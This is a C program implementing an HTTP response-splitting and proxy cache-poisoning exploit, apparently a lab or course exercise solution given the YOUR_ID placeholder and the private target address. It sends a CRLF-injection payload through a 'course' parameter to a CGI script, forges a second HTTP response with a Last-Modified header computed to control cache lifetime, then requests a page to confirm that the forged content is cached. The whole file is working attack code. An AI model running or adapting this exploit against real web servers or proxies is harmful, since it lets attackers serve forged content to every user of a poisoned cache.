#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define YOUR_ID "123456789"
#define ONE_HOUR 3600
#define TARGET_IP "192.168.1.202"
#define TARGET_PORT 8080
#define BUFFER_SIZE 8192

/**
 * Generates an RFC 1123 formatted timestamp for the Last-Modified header.
 * The timestamp is set to exactly 1 hour before the current time.
 * 
 * This ensures the proxy cache formula Cache_Time = (Current_Time - Last_Modified) * 0.1
 * gives us approximately 360 seconds (6 minutes) of cache duration.
 * 
 * @param buffer Output buffer to store the formatted timestamp
 * @param buffer_size Size of the output buffer
 */
void generate_last_modified(char *buffer, size_t buffer_size) {
    time_t current_time = time(NULL);
    time_t modified_time = current_time - ONE_HOUR;
    
    struct tm *gmt = gmtime(&modified_time);
    
    strftime(buffer, buffer_size, "%a, %d %b %Y %H:%M:%S GMT", gmt);
}

/**
 * URL-encodes a string according to RFC 3986.
 * 
 * Encodes all characters except unreserved characters (A-Z, a-z, 0-9, -, _, ., ~).
 * Spaces are converted to '+'. All other characters are percent-encoded as %XX.
 * 
 * @param str Input string to encode
 * @return Pointer to static buffer containing the encoded string
 */
char* url_encode(const char *str) {
    static char encoded[8192];
    char *ptr = encoded;
    
    while (*str) {
        if ((*str >= 'A' && *str <= 'Z') ||
            (*str >= 'a' && *str <= 'z') ||
            (*str >= '0' && *str <= '9') ||
            *str == '-' || *str == '_' || *str == '.' || *str == '~') {
            *ptr++ = *str;
        } else if (*str == ' ') {
            *ptr++ = '+';
        } else {
            sprintf(ptr, "%%%02X", (unsigned char)*str);
            ptr += 3;
        }
        str++;
    }
    *ptr = '\0';
    
    return encoded;
}

/**
 * Constructs the complete HTTP request with response splitting payload.
 * 
 * Creates a GET request to /cgi-bin/course_selector with a malicious 'course' parameter.
 * The parameter contains a URL-encoded HTTP response splitting attack that:
 * 1. Breaks out of the original response with CRLF injection
 * 2. Terminates the first response with Content-Length: 0
 * 3. Injects a second HTTP/1.1 200 OK response with:
 *    - Calculated Content-Length matching the body size
 *    - Last-Modified header (current time - 1 hour) for cache control
 *    - Content-Type: text/html
 *    - Body containing <HTML>[YOUR_ID]</HTML>
 * 
 * @return Pointer to static buffer containing the full HTTP request
 */
char* build_full_request() {
    char last_modified[128];
    generate_last_modified(last_modified, sizeof(last_modified));
    
    char body[256];
    snprintf(body, sizeof(body), "<HTML>%s</HTML>", YOUR_ID);
    
    size_t body_length = strlen(body);
    
    char second_response[2048];
    snprintf(second_response, sizeof(second_response),
        "HTTP/1.1 200 OK\r\n"
        "Content-Length: %zu\r\n"
        "Last-Modified: %s\r\n"
        "Content-Type: text/html\r\n"
        "\r\n"
        "%s",
        body_length,
        last_modified,
        body
    );
    
    char injection[4096];
    snprintf(injection, sizeof(injection),
        "\r\n"
        "Content-Length: 0\r\n"
        "\r\n"
        "%s",
        second_response
    );
    
    char *encoded = url_encode(injection);
    
    static char full_request[16384];
    snprintf(full_request, sizeof(full_request),
        "GET /cgi-bin/course_selector?course=%s HTTP/1.1\r\n"
        "Host: 192.168.1.202:8080\r\n"
        "Connection: keep-alive\r\n"
        "\r\n",
        encoded
    );
    
    return full_request;
}

int main(void) {
    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    ssize_t bytes_sent, bytes_received;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        fprintf(stderr, "Error: Failed to create socket\n");
        return 1;
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &server_addr.sin_addr) <= 0) {
        fprintf(stderr, "Error: Invalid address\n");
        close(sockfd);
        return 1;
    }
    
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        fprintf(stderr, "Error: Connection failed\n");
        close(sockfd);
        return 1;
    }
    
    char *first_request = build_full_request();
    size_t request_len = strlen(first_request);
    bytes_sent = send(sockfd, first_request, request_len, 0);
    if (bytes_sent < 0 || (size_t)bytes_sent != request_len) {
        fprintf(stderr, "Error: Failed to send first request\n");
        close(sockfd);
        return 1;
    }
    
    bytes_received = recv(sockfd, buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received < 0) {
        fprintf(stderr, "Error: Failed to receive first response\n");
        close(sockfd);
        return 1;
    }
    
    const char *second_request = 
        "GET /67607.html HTTP/1.1\r\n"
        "Host: 192.168.1.202:8080\r\n"
        "Connection: close\r\n"
        "\r\n";
    
    size_t second_len = strlen(second_request);
    bytes_sent = send(sockfd, second_request, second_len, 0);
    if (bytes_sent < 0 || (size_t)bytes_sent != second_len) {
        fprintf(stderr, "Error: Failed to send second request\n");
        close(sockfd);
        return 1;
    }
    
    bytes_received = recv(sockfd, buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received < 0) {
        fprintf(stderr, "Error: Failed to receive second response\n");
        close(sockfd);
        return 1;
    }
    buffer[bytes_received] = '\0';
    printf("%s", buffer);
    
    close(sockfd);
    return 0;
}
